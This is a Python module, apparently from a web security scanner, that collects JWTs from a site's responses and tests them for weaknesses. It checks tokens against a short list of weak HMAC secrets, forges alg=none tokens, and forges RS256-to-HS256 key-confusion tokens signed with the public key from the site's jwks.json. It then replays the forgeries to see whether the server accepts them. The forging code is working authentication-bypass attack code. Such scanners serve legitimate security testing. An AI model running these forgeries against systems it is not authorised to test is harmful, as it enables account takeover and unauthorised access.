"""JWT discovery and weak-crypto testing (none / RS->HS confusion / weak secret)."""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
from urllib.parse import urlparse

from core.http_client import HttpClient
from core.reporter import Finding
from . import evidence

JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")

WEAK_SECRETS = ["secret", "password", "123456", "jwt", "changeme"]
HASHES = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
AUTH_FAIL_MARKERS = (
    "invalid token", "invalid signature", "unauthorized",
    "forbidden", "token expired", "not authenticated",
)


def _b64d(segment: str) -> bytes:
    return base64.urlsafe_b64decode(segment + "=" * (-len(segment) % 4))


def _b64e(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _decode(token: str) -> tuple[dict, dict] | None:
    try:
        header, payload, _ = token.split(".")
        return json.loads(_b64d(header)), json.loads(_b64d(payload))
    except Exception:
        return None


def _collect(resp) -> list[dict]:
    found: list[dict] = []
    seen: set[str] = set()

    for token in JWT_RE.findall(resp.headers.get("authorization", "")):
        if token not in seen:
            seen.add(token)
            found.append({"token": token, "source": "header"})

    set_cookie = resp.headers.get("set-cookie", "")
    for token in JWT_RE.findall(set_cookie):
        if token in seen:
            continue
        seen.add(token)
        match = re.search(r"([^=;\s,]+)=" + re.escape(token), set_cookie)
        name = match.group(1) if match else "session"
        found.append({"token": token, "source": f"cookie:{name}"})

    for token in JWT_RE.findall(resp.body):
        if token not in seen:
            seen.add(token)
            found.append({"token": token, "source": "body"})

    return found


async def _send_with(client: HttpClient, page: str, token: str, source: str):
    if source.startswith("cookie:"):
        name = source.split(":", 1)[1]
        return await client.get(page, headers={"Cookie": f"{name}={token}"})
    return await client.get(page, headers={"Authorization": f"Bearer {token}"})


def _similar(a, b) -> bool:
    if not a or not b:
        return False
    if a.status != b.status:
        return False
    if len(a.body) == len(b.body):
        return True
    base = max(len(a.body), len(b.body), 1)
    return abs(len(a.body) - len(b.body)) / base <= 0.05


def _accepted(baseline, original, forged) -> bool:
    """A forged token is 'accepted' when it reaches the same view as the real token,
    or when a protected resource (401/403 without token) becomes reachable."""
    if not forged or forged.status in (401, 403):
        return False
    if any(marker in forged.body.lower() for marker in AUTH_FAIL_MARKERS):
        return False
    if baseline is None:
        return False
    if baseline.status in (401, 403) and forged.status == 200:
        return True
    # Only trust similarity when the real token actually changes the response.
    token_sensitive = original is not None and not _similar(baseline, original)
    return token_sensitive and _similar(original, forged)


def _weak_secret(token: str) -> str | None:
    parts = token.split(".")
    if len(parts) != 3 or not parts[2]:
        return None
    decoded = _decode(token)
    if not decoded:
        return None
    hfunc = HASHES.get(str(decoded[0].get("alg", "")).upper())
    if not hfunc:
        return None
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    try:
        signature = _b64d(parts[2])
    except Exception:
        return None
    for secret in WEAK_SECRETS:
        if hmac.compare_digest(hmac.new(secret.encode(), signing_input, hfunc).digest(), signature):
            return secret
    return None


def _forge_none(token: str) -> str | None:
    parts = token.split(".")
    if len(parts) != 3:
        return None
    decoded = _decode(token)
    if not decoded:
        return None
    header = decoded[0]
    header["alg"] = "none"
    new_header = _b64e(json.dumps(header, separators=(",", ":")).encode())
    return f"{new_header}.{parts[1]}."


def _forge_hs(token: str, secret: bytes, algo: str = "HS256") -> str | None:
    parts = token.split(".")
    if len(parts) != 3:
        return None
    decoded = _decode(token)
    if not decoded:
        return None
    header = decoded[0]
    header["alg"] = algo
    new_header = _b64e(json.dumps(header, separators=(",", ":")).encode())
    signing_input = f"{new_header}.{parts[1]}".encode()
    signature = _b64e(hmac.new(secret, signing_input, HASHES[algo]).digest())
    return f"{new_header}.{parts[1]}.{signature}"


def _der_len(length: int) -> bytes:
    if length < 0x80:
        return bytes([length])
    raw = length.to_bytes((length.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(raw)]) + raw


def _der(tag: int, content: bytes) -> bytes:
    return bytes([tag]) + _der_len(len(content)) + content


def _der_int(value: int) -> bytes:
    raw = value.to_bytes((value.bit_length() + 7) // 8 or 1, "big")
    if raw[0] & 0x80:
        raw = b"\x00" + raw
    return _der(0x02, raw)


def _jwk_to_pem(jwk: dict) -> bytes | None:
    n_b64, e_b64 = jwk.get("n"), jwk.get("e")
    if not n_b64 or not e_b64:
        return None
    try:
        n = int.from_bytes(_b64d(n_b64), "big")
        e = int.from_bytes(_b64d(e_b64), "big")
    except Exception:
        return None
    rsa_pub = _der(0x30, _der_int(n) + _der_int(e))
    rsa_oid = _der(0x06, bytes.fromhex("2a864886f70d010101"))
    alg_id = _der(0x30, rsa_oid + _der(0x05, b""))
    spki = _der(0x30, alg_id + _der(0x03, b"\x00" + rsa_pub))
    encoded = base64.b64encode(spki).decode("ascii")
    lines = "\n".join(encoded[i:i + 64] for i in range(0, len(encoded), 64))
    return f"-----BEGIN PUBLIC KEY-----\n{lines}\n-----END PUBLIC KEY-----\n".encode("ascii")


async def _jwks_pem(client: HttpClient, page: str, kid: str | None) -> bytes | None:
    parsed = urlparse(page)
    resp = await client.get(f"{parsed.scheme}://{parsed.netloc}/.well-known/jwks.json")
    if not resp or resp.status != 200:
        return None
    try:
        data = json.loads(resp.body)
    except Exception:
        return None
    keys = [k for k in (data.get("keys") or []) if k.get("kty") == "RSA"]
    if kid:
        keys = [k for k in keys if k.get("kid") == kid] or keys
    for jwk in keys:
        pem = _jwk_to_pem(jwk)
        if pem:
            return pem
    return None


async def run(client: HttpClient, pages: list[str]) -> list[Finding]:
    findings: list[Finding] = []
    for page in pages:
        resp = await client.get(page)
        if not resp:
            continue
        tokens = _collect(resp)
        if not tokens:
            continue
        baseline = await client.get(page)

        for item in tokens:
            token, source = item["token"], item["source"]
            decoded = _decode(token)
            if not decoded:
                continue
            header = decoded[0]
            alg = str(header.get("alg", "?"))

            findings.append(evidence.from_response(
                check="jwt",
                severity="medium",
                url=page,
                detail=f"JWT terekspos (alg={alg}, source={source})",
                resp=resp,
                payload=token,
            ))

            secret = _weak_secret(token)
            if secret:
                findings.append(evidence.from_response(
                    check="jwt",
                    severity="high",
                    url=page,
                    detail=f"JWT memakai weak HMAC secret ('{secret}')",
                    resp=resp,
                    payload=token,
                ))

            original = await _send_with(client, page, token, source)

            forged = _forge_none(token)
            if forged:
                accepted = await _send_with(client, page, forged, source)
                if _accepted(baseline, original, accepted):
                    findings.append(evidence.from_response(
                        check="jwt",
                        severity="critical",
                        url=page,
                        detail=f"JWT alg=none diterima (source={source})",
                        resp=accepted,
                        payload=forged,
                    ))
                    continue

            if alg.upper().startswith("RS"):
                pem = await _jwks_pem(client, page, header.get("kid"))
                if pem:
                    forged = _forge_hs(token, pem)
                    if forged:
                        accepted = await _send_with(client, page, forged, source)
                        if _accepted(baseline, original, accepted):
                            findings.append(evidence.from_response(
                                check="jwt",
                                severity="critical",
                                url=page,
                                detail="JWT alg confusion RS256→HS256 diterima "
                                       "(public key dipakai sebagai HMAC secret)",
                                resp=accepted,
                                payload=forged,
                            ))

    return findings
